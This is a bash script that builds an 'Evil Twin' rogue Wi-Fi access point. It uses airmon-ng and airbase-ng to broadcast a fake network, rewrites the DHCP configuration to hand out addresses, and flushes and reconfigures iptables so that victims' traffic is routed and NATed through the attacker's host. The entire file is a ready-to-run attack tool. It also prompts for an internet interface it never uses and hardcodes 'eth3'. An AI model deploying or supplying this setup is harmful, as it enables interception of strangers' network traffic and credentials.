#!/bin/bash

# author : @s4nth0


# "Weapon"ising Phase - Gathering Required Information
echo -n "Enter your wlan interface and press [ENTER] (e.g. wlan0): "
read iwlan
echo -n "Enter the Evil AP's SSID and press [ENTER] (e.g. EvilTwin): "
read ssid
echo -n "Enter the Evil AP's Channel and press [ENTER] (e.g. 11): "
read channel
echo -n "Enter the LAN/WLAN interface name which should be bridged to the internet and press [ENTER] (e.g. eth0): "
read inet_int

# Setting up the DHCP
echo "Taking backup of /etc/dhcp3/dhcpd.conf to /etc/dhcp3/backup_dhcpd.conf"
cp /etc/dhcp3/dhcpd.conf /etc/dhcp3/backup_dhcpd.conf

echo "ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
option subnet-mask 255.255.255.0;
option broadcast-address 10.0.0.255;
option routers 10.0.0.254;
option domain-name-servers 8.8.8.8;
range 10.0.0.1 10.0.0.140;
}" > /etc/dhcp3/dhcpd.conf


echo "Stopping DHCP..."
pkill dhcpd3
sleep 5;

echo "Stopping Airbase-ng (if any process is already running)..."
pkill airbase-ng
sleep 2;

echo "Stating Promiscuous Mode Interface"
airmon-ng stop $iwlan 
sleep 5; 
airmon-ng start $iwlan 
sleep 5;
echo "Starting Fake AP..."
airbase-ng -e $ssid -c $channel -v mon0 &
sleep 5;

ifconfig at0 up
ifconfig at0 10.0.0.254 netmask 255.255.255.0 # Change IP addresses as configured in your dhcpd.conf
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254

sleep 5;

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth3 -j MASQUERADE # Change eth3 to your internet facing interface

echo > '/var/lib/dhcp3/dhcpd.leases'
ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &

sleep 5;
echo "1" > /proc/sys/net/ipv4/ip_forward

